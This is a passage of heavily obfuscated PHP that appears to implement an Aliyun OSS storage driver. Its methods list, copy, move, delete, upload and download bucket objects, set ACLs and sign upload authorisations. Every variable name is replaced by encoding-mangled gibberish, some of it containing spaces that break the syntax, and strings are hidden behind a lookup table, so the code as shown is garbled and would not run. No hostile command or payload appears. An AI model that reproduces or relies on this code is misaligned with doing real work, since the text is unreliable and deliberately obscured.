$áÃÅ´±£, $Ê“Ú‹¨[1622] => $ŠãşÙ÷); $this->cacheMethodInfoSet($Èëåñ¿•, $ÌæÎ¯œ, $ŒØ–à); if ($ÌæÎ¯œ) { $Àöê¢œÓ[] = $Èëåñ¿•; continue; } $èÉ³ù˜Í[] = $œ—­şï; } foreach ($•¢ì¨‚Ö as $øâóÁñ¬) { $Àöê¢œÓ[] = $øâóÁñ¬->getPrefix(); $this->cacheMethodInfoSet($øâóÁñ¬->getPrefix(), !0); } if ($éğğ³ÙÇ === $Ê“Ú‹¨[12]) { break; } } $this->cacheMethodInfoSet($¸š·‘€ã, !0); return array($Ê“Ú‹¨[85] => $Àöê¢œÓ, $Ê“Ú‹¨[86] => $èÉ³ù˜Í); } public function listObject($ÑÕÑÉÌ÷, $§éœ» = '') { $ä€‹èÈÃ =& $_SERVER[¿ÈˆÑ¸ä]; $ÑÕÑÉÌ÷ = trim($ÑÕÑÉÌ÷, $ä€‹èÈÃ[8]); $‡—üçœâ = empty($ÑÕÑÉÌ÷) && $ÑÕÑÉÌ÷ !== $ä€‹èÈÃ[229] ? $ä€‹èÈÃ[12] : $ÑÕÑÉÌ÷ . $ä€‹èÈÃ[8]; $è˜ú³°ğ = $ä€‹èÈÃ[12]; $ßÅ¡¹µî = 1000; $üËËç‹ = $Ûñä­½ = array(); while (!0) { check_abort(); $õûª³£ı = array($ä€‹èÈÃ[1618] => $§éœ», $ä€‹èÈÃ[1619] => $‡—üçœâ, $ä€‹èÈÃ[1620] => $ßÅ¡¹µî, $ä€‹èÈÃ[1621] => $è˜ú³°ğ); try { $½•à·ú£ = $this->client->listObjects($this->bucket, $õûª³£ı); } catch (OSS\Core\OssException $©–…ûü‚) { $this->writeLog(__FUNCTION__ . $ä€‹èÈÃ[213] . $©–…ûü‚->getMessage()); break; } $è˜ú³°ğ = $½•à·ú£->getNextMarker(); $äŒ³’Ùğ = $½•à·ú£->getObjectList(); foreach ($äŒ³’Ùğ as $•ö–±ªÇ) { if ($•ö–±ªÇ->getKey() == $‡—üçœâ) { continue; } $Ğµ§¥ñ = $•ö–±ªÇ->getKey(); $€óˆÈ³Ü = $•ö–±ªÇ->getSize(); $ŞÆÑ†î‰ = $€óˆÈ³Ü == 0 && substr($Ğµ§¥ñ, strlen($Ğµ§¥ñ) - 1, 1) == $ä€‹èÈÃ[8] ? !0 : !1; if ($ŞÆÑ†î‰) { continue; } $Ûñä­½[] = $€óˆÈ³Ü . $ä€‹èÈÃ[213] . $Ğµ§¥ñ; } if ($è˜ú³°ğ === $ä€‹èÈÃ[12]) { break; } } return array($ä€‹èÈÃ[85] => $üËËç‹, $ä€‹èÈÃ[86] => $Ûñä­½); } public function copyFile($§…¢Æ´, $Ê—£œ ®) { $ÛÍÅË³ = $this->size($§…¢Æ´); if ($ÛÍÅË³ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $§…¢Æ´, $this->bucket, $this->pathEncode($Ê—£œ ®)); } catch (OSS\Core\OssException $©Í÷üæ ) { $this->writeLog(__FUNCTION__ . $_SERVER[¿ÈˆÑ¸ä][213] . $©Í÷üæ ->getMessage()); return !1; } return $this->getPathOuter($Ê—£œ ®); } $ˆÎÙğÎ£ = $this->multiCopyObject($§…¢Æ´, $Ê—£œ ®, $ÛÍÅË³); return $ˆÎÙğÎ£ ? $this->getPathOuter($Ê—£œ ®) : !1; } private function multiCopyObject($¨ÆËÆ­, $ÆüŒ¥ë, $¤¬Œ½£) { $¦¼òÄ =& $_SERVER[¿ÈˆÑ¸ä]; try { $ºì‘òÃù = array(); if ($òüÜ¿£ = $this->hashMd5($¨ÆËÆ­)) { $ºì‘òÃù = array(OSS\OssClient::OSS_HEADERS => array($¦¼òÄ[1625] => $òüÜ¿£)); } $„á¯¢Ñ¼ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ÆüŒ¥ë), $ºì‘òÃù); $£çšÓ±ß = 1; $ùÇ¬Ñöõ = 0; $Ì™¤ÆÀ = array(); $íÔÉ¥ò = 1024 * 1024 * 10; $İÖæ®†² = $this->client->generateMultiuploadParts($¤¬Œ½£, $íÔÉ¥ò); foreach ($İÖæ®†² as $ÌûÍˆ€Â => $óØƒ´ûÅ) { $•ºöûÁÌ = $ùÇ¬Ñöõ + (int) $óØƒ´ûÅ[$¦¼òÄ[1626]]; $³ÕÄû±ƒ = (int) $óØƒ´ûÅ[$¦¼òÄ[413]] + $•ºöûÁÌ - 1; $Š™Ù·É‹ = array($¦¼òÄ[165] => $•ºöûÁÌ, $¦¼òÄ[166] => $³ÕÄû±ƒ); $Ì™¤ÆÀ[] = $this->client->uploadPartCopy($this->bucket, $¨ÆËÆ­, $this->bucket, $this->pathEncode($ÆüŒ¥ë), $£çšÓ±ß, $„á¯¢Ñ¼, $Š™Ù·É‹); $£çšÓ±ß = $£çšÓ±ß + 1; } $Íëêô– = array(); foreach ($Ì™¤ÆÀ as $ÌûÍˆ€Â => $ª¥£Óˆ) { $Íëêô–[] = array($¦¼òÄ[298] => $ÌûÍˆ€Â + 1, $¦¼òÄ[299] => $ª¥£Óˆ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ÆüŒ¥ë), $„á¯¢Ñ¼, $Íëêô–); } catch (OSS\Core\OssException $öÅ·Áê€) { $this->writeLog(__FUNCTION__ . $¦¼òÄ[213] . $öÅ·Áê€->getMessage()); return !1; } return !0; } public function moveFile($ø š¾õ, $©İÑâ¹¢) { if ($this->copyFile($ø š¾õ, $©İÑâ¹¢)) { $this->remove($ø š¾õ); return $this->getPathOuter($©İÑâ¹¢); } return !1; } public function delFile($Á¿•Ù°˜) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Á¿•Ù°˜)); } catch (OSS\Core\OssException $˜Û‘¸Ë) { $this->writeLog(__FUNCTION__ . $_SERVER[¿ÈˆÑ¸ä][213] . $˜Û‘¸Ë->getMessage()); return !1; } return !0; } public function delFolder($¬´îÏÑÙ) { $ü¢´àˆ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->exist($¬´îÏÑÙ)) { return !0; } $this->listItemCache = !1; $ùäèÎêÄ = $this->fileList($¬´îÏÑÙ); $this->listItemCache = !0; $‘Ÿ†„õŠ = trim($¬´îÏÑÙ, $ü¢´àˆ[8]) . $ü¢´àˆ[8]; if (!empty($¬´îÏÑÙ) && $¬´îÏÑÙ !== $ü¢´àˆ[229] && !in_array($‘Ÿ†„õŠ, $ùäèÎêÄ[$ü¢´àˆ[85]])) { $ùäèÎêÄ[$ü¢´àˆ[85]][] = $‘Ÿ†„õŠ; } $Öµê™¢å = $this->delByBatch($ùäèÎêÄ[$ü¢´àˆ[86]]); if (!$Öµê™¢å) { return !1; } $Öµê™¢å = $this->delByBatch($ùäèÎêÄ[$ü¢´àˆ[85]]); if (!$Öµê™¢å) { return !1; } return $this->delFile($‘Ÿ†„õŠ); } private function delByBatch($±ôµ‘ü÷) { foreach (array_chunk($±ôµ‘ü÷, 1000) as $ç£ãÜˆŒ) { try { $this->client->deleteObjects($this->bucket, $ç£ãÜˆŒ); } catch (OSS\Core\OssException $·ëÍ§ïõ) { $this->writeLog(__FUNCTION__ . $_SERVER[¿ÈˆÑ¸ä][213] . $·ëÍ§ïõ->getMessage()); return !1; } } return !0; } public function rename($”§¢æ·§, $°ÛÄ©°) { return $this->renameObject($”§¢æ·§, $°ÛÄ©°); } private function fileInfo($©«àÏÁ›, $£ùê”ÕĞ = false, $ìËí±ºÀ = array()) { $®õ¾İß· =& $_SERVER[¿ÈˆÑ¸ä]; $¿Ó÷ÇöÍ = array($®õ¾İß·[32] => $this->pathThis($©«àÏÁ›), $®õ¾İß·[87] => $this->getPathOuter($©«àÏÁ›), $®õ¾İß·[33] => $®õ¾İß·[231], $®õ¾İß·[79] => isset($ìËí±ºÀ[$®õ¾İß·[79]]) ? $ìËí±ºÀ[$®õ¾İß·[79]] : 0, $®õ¾İß·[167] => $this->ext($©«àÏÁ›)); if ($£ùê”ÕĞ) { return $¿Ó÷ÇöÍ; } $¿Ó÷ÇöÍ[$®õ¾İß·[232]] = $¿Ó÷ÇöÍ[$®õ¾İß·[88]] = 0; $¿Ó÷ÇöÍ[$®õ¾İß·[233]] = $¿Ó÷ÇöÍ[$®õ¾İß·[234]] = !0; if (empty($ìËí±ºÀ)) { $‹‹÷°Œ = $this->objectMeta($©«àÏÁ›); if (!$‹‹÷°Œ) { return $¿Ó÷ÇöÍ; } $ìËí±ºÀ = array($®õ¾İß·[88] => strtotime($‹‹÷°Œ[$®õ¾İß·[1624]]), $®õ¾İß·[79] => $‹‹÷°Œ[$®õ¾İß·[1623]] + 0, $®õ¾İß·[1622] => $‹‹÷°Œ[$®õ¾İß·[1622]]); } if (isset($ìËí±ºÀ[$®õ¾İß·[1622]]) && $ìËí±ºÀ[$®õ¾İß·[1622]]) { $¿Ó÷ÇöÍ[$®õ¾İß·[236]] = trim($ìËí±ºÀ[$®õ¾İß·[1622]], $®õ¾İß·[119]); } if (isset($ìËí±ºÀ[$®õ¾İß·[79]])) { $¿Ó÷ÇöÍ[$®õ¾İß·[79]] = $ìËí±ºÀ[$®õ¾İß·[79]]; } if (isset($ìËí±ºÀ[$®õ¾İß·[88]])) { $¿Ó÷ÇöÍ[$®õ¾İß·[88]] = $ìËí±ºÀ[$®õ¾İß·[88]]; } if (isset($ìËí±ºÀ[$®õ¾İß·[205]]) && !trim($¿Ó÷ÇöÍ[$®õ¾İß·[88]])) { $¿Ó÷ÇöÍ[$®õ¾İß·[88]] = $ìËí±ºÀ[$®õ¾İß·[205]]; } return $¿Ó÷ÇöÍ; } private function folderInfo($øÊêÉÑ¡, $üß¤¿ ¹ = false, $™Üİ¹ü× = array()) { $«¯ıİÅó =& $_SERVER[¿ÈˆÑ¸ä]; $áş¸ˆ‰® = array($«¯ıİÅó[32] => $this->pathThis($øÊêÉÑ¡), $«¯ıİÅó[87] => $this->getPathOuter($«¯ıİÅó[8] . $øÊêÉÑ¡), $«¯ıİÅó[33] => $«¯ıİÅó[78]); if ($üß¤¿ ¹) { return $áş¸ˆ‰®; } $áş¸ˆ‰®[$«¯ıİÅó[232]] = $áş¸ˆ‰®[$«¯ıİÅó[88]] = 0; $áş¸ˆ‰®[$«¯ıİÅó[233]] = $áş¸ˆ‰®[$«¯ıİÅó[234]] = !0; if (empty($™Üİ¹ü×)) { $øÊêÉÑ¡ = rtrim($øÊêÉÑ¡, $«¯ıİÅó[8]) . $«¯ıİÅó[8]; $ÈŸã¹Ø¥ = $this->objectMeta($øÊêÉÑ¡); if (!$ÈŸã¹Ø¥) { return $áş¸ˆ‰®; } $™Üİ¹ü× = array($«¯ıİÅó[232] => $ÈŸã¹Ø¥[$«¯ıİÅó[591]][$«¯ıİÅó[1627]], $«¯ıİÅó[88] => strtotime($ÈŸã¹Ø¥[$«¯ıİÅó[1624]])); } if (isset($™Üİ¹ü×[$«¯ıİÅó[88]])) { $áş¸ˆ‰®[$«¯ıİÅó[88]] = $™Üİ¹ü×[$«¯ıİÅó[88]]; } if (isset($™Üİ¹ü×[$«¯ıİÅó[232]])) { $áş¸ˆ‰®[$«¯ıİÅó[232]] = $™Üİ¹ü×[$«¯ıİÅó[232]]; } return $áş¸ˆ‰®; } public function listPath($‚£æÄ³·, $“ëÉ±õê = false) { $şØôĞ¡Ù =& $_SERVER[¿ÈˆÑ¸ä]; $àÅ Ø™Ğ = $this->fileList($‚£æÄ³·, $şØôĞ¡Ù[8], !0); foreach ($àÅ Ø™Ğ[$şØôĞ¡Ù[85]] as $âõì’­Ñ => $¡§èòû­) { $àÅ Ø™Ğ[$şØôĞ¡Ù[85]][$âõì’­Ñ] = $this->folderInfo($¡§èòû­, $“ëÉ±õê, $¡§èòû­); } foreach ($àÅ Ø™Ğ[$şØôĞ¡Ù[86]] as $âõì’­Ñ => $¡§èòû­) { $àÅ Ø™Ğ[$şØôĞ¡Ù[86]][$âõì’­Ñ] = $this->fileInfo($¡§èòû­[$şØôĞ¡Ù[32]], $“ëÉ±õê, $¡§èòû­); } return $àÅ Ø™Ğ; } protected function infoChildren($ßŠ¶ÃÃ, &$ÑïªÅ˜) { $â»øàÈã =& $_SERVER[¿ÈˆÑ¸ä]; $¢£‚ã× = $this->fileList($ßŠ¶ÃÃ, $â»øàÈã[12], !0); $ÑïªÅ˜[$â»øàÈã[81]] += count($¢£‚ã×[$â»øàÈã[85]]); $ÑïªÅ˜[$â»øàÈã[80]] += count($¢£‚ã×[$â»øàÈã[86]]); foreach ($¢£‚ã×[$â»øàÈã[86]] as $®’ôéÇ®) { if (!$®’ôéÇ® || !$®’ôéÇ®[$â»øàÈã[79]]) { continue; } $ÑïªÅ˜[$â»øàÈã[79]] += $®’ôéÇ®[$â»øàÈã[79]]; } } public function has($¶öÁŞâü, $¸„…Óò = false, $²°İ¢È¿ = true) { $ùòÛ˜ç =& $_SERVER[¿ÈˆÑ¸ä]; $¶öÁŞâü = trim($¶öÁŞâü, $ùòÛ˜ç[8]); $êĞÓ¤ù© = empty($¶öÁŞâü) && $¶öÁŞâü !== $ùòÛ˜ç[229] ? $ùòÛ˜ç[12] : $¶öÁŞâü . $ùòÛ˜ç[8]; $ÒÔº‰™Ø = $ùòÛ˜ç[12]; $ËÒ“ß‹Ë = 500; $ä¢åÊà× = $Ù†‚£¨• = 0; while (!0) { check_abort(); $ ¥‘Şæ = array($ùòÛ˜ç[1618] => $ùòÛ˜ç[8], $ùòÛ˜ç[1619] => $êĞÓ¤ù©, $ùòÛ˜ç[1620] => $ËÒ“ß‹Ë, $ùòÛ˜ç[1621] => $ÒÔº‰™Ø); try { $Üö™êÑ = $this->client->listObjects($this->bucket, $ ¥‘Şæ); } catch (OSS\Core\OssException $Ö÷‘É—Ç) { $this->writeLog(__FUNCTION__ . $ùòÛ˜ç[213] . $Ö÷‘É—Ç->getMessage()); break; } $ÒÔº‰™Ø = $Üö™êÑ->getNextMarker(); $êôéãõ¶ = $Üö™êÑ->getObjectList(); $õÊğî×ƒ = $Üö™êÑ->getPrefixList(); if ($¸„…Óò) { if (count($êôéãõ¶) > 1 || count($êôéãõ¶) == 1 && $êôéãõ¶[0]->getKey() != $êĞÓ¤ù©) { $ä¢åÊà× += count($êôéãõ¶) - 1; } if (!empty($õÊğî×ƒ)) { $Ù†‚£¨• += count($õÊğî×ƒ); } if ($ÒÔº‰™Ø === $ùòÛ˜ç[12]) { break; } continue; } if ($²°İ¢È¿) { if (!empty($êôéãõ¶)) { if (count($êôéãõ¶) > 1 || $êôéãõ¶[0]->getKey() != $êĞÓ¤ù©) { return !0; } } } else { if (!empty($õÊğî×ƒ)) { return !0; } } if ($ÒÔº‰™Ø === $ùòÛ˜ç[12]) { break; } } if ($¸„…Óò) { return array($ùòÛ˜ç[240] => $ä¢åÊà×, $ùòÛ˜ç[241] => $Ù†‚£¨•); } return !1; } public function listAll($Ì…¤İİ) { $¨ªßíÕó =& $_SERVER[¿ÈˆÑ¸ä]; $Şà¡¢“À = $this->fileList($Ì…¤İİ, $¨ªßíÕó[12], !0); $äğ¼“´ = array_to_keyvalue($Şà¡¢“À[$¨ªßíÕó[86]], $¨ªßíÕó[32]); foreach ($Şà¡¢“À[$¨ªßíÕó[85]] as $–êí¡¼Ï) { if (is_string($–êí¡¼Ï)) { $äğ¼“´[$–êí¡¼Ï] = array($¨ªßíÕó[79] => 0); } } return $this->listAllFiles($Ì…¤İİ, $äğ¼“´); } public function canRead($šŞñøÃº) { $ç¨–… õ =& $_SERVER[¿ÈˆÑ¸ä]; $ëúó‚×Ş = $this->pathAcl($šŞñøÃº); return $ëúó‚×Ş == $ç¨–… õ[1628] || $ëúó‚×Ş == $ç¨–… õ[638] ? !0 : !1; } public function canWrite($°†ì¿„Ä) { $šËÑâ² = $this->pathAcl($°†ì¿„Ä); return $šËÑâ² == $_SERVER[¿ÈˆÑ¸ä][638] ? !0 : !1; } public function pathAcl($ß‡²â¸ë) { $‚³ıÎš =& $_SERVER[¿ÈˆÑ¸ä]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $¼ç§ßÍ­ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ß‡²â¸ë)); } catch (OSS\Core\OssException $«§úÛæì) { $this->writeLog(__FUNCTION__ . $‚³ıÎš[213] . $«§úÛæì->getMessage()); return !1; } $ÉİªÎœÍ = $¼ç§ßÍ­ == $‚³ıÎš[37] ? $this->bucketAcl : $¼ç§ßÍ­; if ($ÉİªÎœÍ == $‚³ıÎš[1629]) { return $‚³ıÎš[1628]; } if ($ÉİªÎœÍ == $‚³ıÎš[1630]) { return $‚³ıÎš[638]; } return $ÉİªÎœÍ; } private function chmodPath($×Üƒ½Öß, $ûÌÓà™Ï = '') { $¾¬«ÜÁƒ =& $_SERVER[¿ÈˆÑ¸ä]; $áï‚ÔîŒ = empty($ûÌÓà™Ï) ? $¾¬«ÜÁƒ[1630] : $ûÌÓà™Ï; $ò¾Š£Ì = array($¾¬«ÜÁƒ[37], $¾¬«ÜÁƒ[230], $¾¬«ÜÁƒ[1629], $¾¬«ÜÁƒ[1630]); if (!in_array($áï‚ÔîŒ, $ò¾Š£Ì)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($×Üƒ½Öß), $áï‚ÔîŒ); } catch (OSS\Core\OssException $À¯âóç) { $this->writeLog(__FUNCTION__ . $¾¬«ÜÁƒ[213] . $À¯âóç->getMessage()); return !1; } return !0; } public function getContent($œÂ®¾…¯) { return $this->fileSubstr($œÂ®¾…¯, -1); } public function setContent($ßªçµ¨¬, $ñ¯òŸ¦ = '') { $›ó£‰ô =& $_SERVER[¿ÈˆÑ¸ä]; try { $ğëıÅ = $this->trafficLimit($›ó£‰ô[1631]); $ç“Ü÷Êù = $this->client->putObject($this->bucket, $this->pathEncode($ßªçµ¨¬), $ñ¯òŸ¦, $ğëıÅ); } catch (OSS\Core\OssException $Ø½ÚÆ˜) { $this->writeLog(__FUNCTION__ . $›ó£‰ô[213] . $Ø½ÚÆ˜->getMessage()); return !1; } $èä ¤ğ£ = array($›ó£‰ô[1625] => trim($ç“Ü÷Êù[$›ó£‰ô[1622]], $›ó£‰ô[119]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ßªçµ¨¬))); $this->updateObjMeta($ßªçµ¨¬, $èä ¤ğ£); return isset($ç“Ü÷Êù[$›ó£‰ô[1632]][$›ó£‰ô[295]]) ? !0 : !1; } private function updateObjMeta($¸§ Šú³, $û¬ÙÅØ‡) { $¸§ Šú³ = $this->pathEncode($¸§ Šú³); try { $“ÆÃ³„ = array(OSS\OssClient::OSS_HEADERS => $û¬ÙÅØ‡); $this->client->copyObject($this->bucket, $¸§ Šú³, $this->bucket, $¸§ Šú³, $“ÆÃ³„); } catch (OSS\Core\OssException $ûû ÉŒŞ) { $this->writeLog(__FUNCTION__ . $_SERVER[¿ÈˆÑ¸ä][213] . $ûû ÉŒŞ->getMessage()); return !1; } return !0; } public function upload($’‚”Êò, $µ‹Š½Ûè, $²£¢éÅı = false, $Æã¹Ôµâ = REPEAT_REPLACE) { $è¿²¢Í· =& $_SERVER[¿ÈˆÑ¸ä]; $»ĞÃâÃ = trim($’‚”Êò, $è¿²¢Í·[8]); $€¢…ÇØ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($è¿²¢Í·[1625] => @md5_file($µ‹Š½Ûè)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($’‚”Êò))); $€¢…ÇØ = $this->trafficLimit($è¿²¢Í·[1631], $€¢…ÇØ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($»ĞÃâÃ), $µ‹Š½Ûè, $€¢…ÇØ); } catch (OSS\Core\OssException $Ä¨„Èä“) { $this->writeLog(__FUNCTION__ . $è¿²¢Í·[213] . $Ä¨„Èä“->getMessage()); return !1; } return $this->getPathOuter($’‚”Êò); } public function getHost() { $Ğ’¼Ø‚„ =& $_SERVER[¿ÈˆÑ¸ä]; $Âı‰ÚîÒ = explode($Ğ’¼Ø‚„[209], parent::getHost()); return $Âı‰ÚîÒ[0] . $Ğ’¼Ø‚„[209] . $this->bucket . $Ğ’¼Ø‚„[10] . $Âı‰ÚîÒ[1]; } public function uploadFormData($øŞ³„İ‰, $µ‡¯ ê³ = 3600) { $ „‚µ× =& $_SERVER[¿ÈˆÑ¸ä]; if (!($Ş£»”£± = $this->getHost())) { return !1; } $…Ï£šÍĞ = $µ‡¯ ê³; $¨Í¡ìÄ¥ = date($ „‚µ×[1633], time() + $…Ï£šÍĞ); $ş£ÜÂ¥Ş = new DateTime($¨Í¡ìÄ¥); $ÓÓšÇêÖ = $ş£ÜÂ¥Ş->format(DateTime::ISO8601); $˜½¼®¾à = strpos($ÓÓšÇêÖ, $ „‚µ×[372]); $ÓÓšÇêÖ = substr($ÓÓšÇêÖ, 0, $˜½¼®¾à) . $ „‚µ×[1634]; $ƒÊĞõ«İ = 1048576000 * 5; $ä°öÌ¾ = $this->pathFather($øŞ³„İ‰); $Æ—Û¦šæ = array($ „‚µ×[263] => $ÓÓšÇêÖ, $ „‚µ×[266] => array(array($ „‚µ×[1635], 0, $ƒÊĞõ«İ), array($ „‚µ×[268], $ „‚µ×[269], $ä°öÌ¾))); $ª¸Ï‘’¼ = base64_encode(json_encode($Æ—Û¦šæ)); $ëÎìÉ¸ã = base64_encode(hash_hmac($ „‚µ×[1460], $ª¸Ï‘’¼, $this->secret, !0)); $èêü¯Í® = array($ „‚µ×[1636] => $this->accessKey, $ „‚µ×[278] => $ª¸Ï‘’¼, $ „‚µ×[271] => $ „‚µ×[262], $ „‚µ×[1637] => $ëÎìÉ¸ã, $ „‚µ×[207] => $Ş£»”£±); $èêü¯Í® = $this->trafficLimit($ „‚µ×[1631], $èêü¯Í®, !0); return $èêü¯Í®; } public function uploadMultiData($±…ŠÓ‰Ú, $€º¶»ìâ = 3600) { $­·æ‰ˆ =& $_SERVER[¿ÈˆÑ¸ä]; if (!($±÷¶‘ÑÚ = $this->getHost())) { return !1; } $Ì×—úõö = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($±…ŠÓ‰Ú)); return array($­·æ‰ˆ[282] => $Ì×—úõö, $­·æ‰ˆ[207] => $±÷¶‘ÑÚ . $­·æ‰ˆ[8] . $this->pathEncode($±…ŠÓ‰Ú), $­·æ‰ˆ[283] => gmdate($­·æ‰ˆ[1638]), $­·æ‰ˆ[95] => $±…ŠÓ‰Ú); } public function uploadMultiAuth($…˜« íá, $ç¡Ïû×ë = array()) { if (isset($ç¡Ïû×ë[$_SERVER[¿ÈˆÑ¸ä][284]])) { return $this->uploadPartAuth($…˜« íá, $ç¡Ïû×ë); } return $this->uploadListAuth($…˜« íá, $ç¡Ïû×ë); } private function uploadPartAuth($Äí„¯Æ˜, $˜Ã–ş = array()) { $Éı°Æû“ =& $_SERVER[¿ÈˆÑ¸ä]; $ô–Ï¨¾ = $˜Ã–ş[$Éı°Æû“[95]]; $¯¯éñŠ = $this->_getUploadAuth($ô–Ï¨¾, $˜Ã–ş); $¦÷Ÿ­¼Õ = array($Éı°Æû“[287] => $¯¯éñŠ[$Éı°Æû“[287]], $Éı°Æû“[283] => $¯¯éñŠ[$Éı°Æû“[283]]); if (isset($¯¯éñŠ[$Éı°Æû“[1639]])) { $¦÷Ÿ­¼Õ[$Éı°Æû“[1639]] = $¯¯éñŠ[$Éı°Æû“[1639]]; } return $¦÷Ÿ­¼Õ; } private function uploadListAuth($½‘–×û, $ ©³Ì¯à = array()) { $¸ØÊŞ½‘ =& $_SERVER[¿ÈˆÑ¸ä]; $÷ÄåÆÃé = $ ©³Ì¯à[$¸ØÊŞ½‘[95]]; $Ü•Ê¯†ù = $ ©³Ì¯à[$¸ØÊŞ½‘[282]]; $¬æİíÌ = $this->client->listParts($this->bucket, $this->pathEncode($÷ÄåÆÃé), $Ü•Ê¯†ù); $Æì©‚§½ = $¬æİíÌ->getListPart(); $Æì›œ¤ = array(); foreach ($Æì©‚§½ as $›½Çöó°) { $Æì›œ¤[] = array($¸ØÊŞ½‘[298] => $›½Çöó°->getPartNumber(), $¸ØÊŞ½‘[299] => trim($›½Çöó°->getETag(), $¸ØÊŞ½‘[119])); } if (!$Æì›œ¤) { return !1; } $ÁÀÄ›Ï» = $this->_getUploadAuth($÷ÄåÆÃé, $ ©³Ì¯à); return array($¸ØÊŞ½‘[287] => $ÁÀÄ›Ï»[$¸ØÊŞ½‘[287]], $¸ØÊŞ½‘[283] => $ÁÀÄ›Ï»[$¸ØÊŞ½‘[283]], $¸ØÊŞ½‘[290] => $Æì›œ¤); } private function _getUploadAuth($ÛÒúÛ¶, $óÄåîÉ¸) { $Óü²æ¼Š =& $_SERVER[¿ÈˆÑ¸ä]; $ı¾ô¡—š = gmdate($Óü²æ¼Š[1638]); $„ĞÀìÄ = isset($óÄåîÉ¸[$Óü²æ¼Š[284]]) ? $Óü²æ¼Š[254] : $Óü²æ¼Š[289]; $±âåĞÁú = array_intersect_key($óÄåîÉ¸, array_flip(array($Óü²æ¼Š[284], $Óü²æ¼Š[282]))); ksort($±âåĞÁú); $ÚƒÙÊÅ„ = $±âåĞÁú ? $Óü²æ¼Š[76] . http_build_query($±âåĞÁú, null, $Óü²æ¼Š[285], PHP_QUERY_RFC3986) : $Óü²æ¼Š[12]; $İøê›Ç² = array($„ĞÀìÄ, $Óü²æ¼Š[12], $Óü²æ¼Š[121], $ı¾ô¡—š, "\x78\x2d\157\163\163\x2d\144\x61\164\x65\72{$ı¾ô¡—š}", $Óü²æ¼Š[8] . $this->bucket . $Óü²æ¼Š[8] . $ÛÒúÛ¶ . $ÚƒÙÊÅ„); if (isset($óÄåîÉ¸[$Óü²æ¼Š[284]])) { $ø«È“ = $this->trafficLimit($Óü²æ¼Š[1631], array(), !0); if ($ø«È“) { $ÛÒúÛ¶ = $Óü²æ¼Š[1639]; array_splice($İøê›Ç², 5, 0, $ÛÒúÛ¶ . $Óü²æ¼Š[4] . $ø«È“[$ÛÒúÛ¶]); } } $‡Ø–ÛÁ = implode($Óü²æ¼Š[286], $İøê›Ç²); $ÚŠ½¹ğ® = base64_encode(hash_hmac($Óü²æ¼Š[1460], $‡Ø–ÛÁ, $this->secret, !0)); $· °ñ¾ = $Óü²æ¼Š[1608] . $this->accessKey . $Óü²æ¼Š[4] . $ÚŠ½¹ğ®; $ñÙ÷ã…º = array($Óü²æ¼Š[287] => $· °ñ¾, $Óü²æ¼Š[283] => $ı¾ô¡—š); if (!empty($ø«È“)) { $ñÙ÷ã…º = array_merge($ñÙ÷ã…º, $ø«È“); } return $ñÙ÷ã…º; } public function download($®ê¨ä­, $ÉÄÅºÉ´) { $¢ØÌÉ™† =& $_SERVER[¿ÈˆÑ¸ä]; if ($this->isFolder($®ê¨ä­)) { return !1; } try { $ü·Ô š² = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ÉÄÅºÉ´); $ü·Ô š² = $this->trafficLimit($¢ØÌÉ™†[110], $ü·Ô š²); $this->client->getObject($this->bucket, $this->pathEncode($®ê¨ä­), $ü·Ô š²); } catch (OSS\Core\OssException $í×Ì£üÅ) { $this->writeLog(__FUNCTION__ . $¢ØÌÉ™†[213] . $í×Ì£üÅ->getMessage()); return !1; } return $ÉÄÅºÉ´; } public function fileSubstr($‘Üóõª€, $ÜÓ êĞÚ = 0, $•ºêÚĞ = false) { if ($ÜÓ êĞÚ === -1) { $¹óÎÍß = array(); } else { if ($•ºêÚĞ === !1) { $‡ìœã‘Ş = $this->size($‘Üóõª€); } else { $‡ìœã‘Ş = $ÜÓ êĞÚ + $•ºêÚĞ - 1; } $¹óÎÍß = array(OSS\OssClient::OSS_RANGE => "{$ÜÓ êĞÚ}\x2d{$‡ìœã‘Ş}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($‘Üóõª€), $¹óÎÍß); } catch (OSS\Core\OssException $ïûšêŒò) { $this->writeLog(__FUNCTION__ . $_SERVER[¿ÈˆÑ¸ä][213] . $ïûšêŒò->getMessage()); think_exception($ïûšêŒò->getMessage()); return !1; } } private function trafficLimit($ïÊÖÍÜ©, $‰ˆÃ„ÕÍ = array(), $ÇººßÎ‡ = false) { $¡±ˆ¡Å‚ =& $_SERVER[¿ÈˆÑ¸ä]; if ($ïÊÖÍÜ© == $¡±ˆ¡Å‚[1631] && $this->isUploadServer() || $ïÊÖÍÜ© == $¡±ˆ¡Å‚[110] && $this->isFileOutServer()) { return $‰ˆÃ„ÕÍ; } $­ÈœÄ’¯ = floatval($GLOBALS[$¡±ˆ¡Å‚[6]][$¡±ˆ¡Å‚[92]][$¡±ˆ¡Å‚[108]][$ïÊÖÍÜ©]) * 1024 * 1024 * 8; if (!$­ÈœÄ’¯) { return $‰ˆÃ„ÕÍ; } $­ÈœÄ’¯ = $­ÈœÄ’¯ < 819200 ? 819200 : ($­ÈœÄ’¯ > 838860800 ? 838860800 : $­ÈœÄ’¯); if ($ÇººßÎ‡) { $‰ˆÃ„ÕÍ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($­ÈœÄ’¯); } else { if (!isset($‰ˆÃ„ÕÍ[OSS\OssClient::OSS_HEADERS])) { $‰ˆÃ„ÕÍ[OSS\OssClient::OSS_HEADERS] = array(); } $‰ˆÃ„ÕÍ[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($­ÈœÄ’¯); } return $‰ˆÃ„ÕÍ; } public function link($Ùãæè, $¤å¦½ = array()) { $ˆ‰ç°­ =& $_SERVER[¿ÈˆÑ¸ä]; if 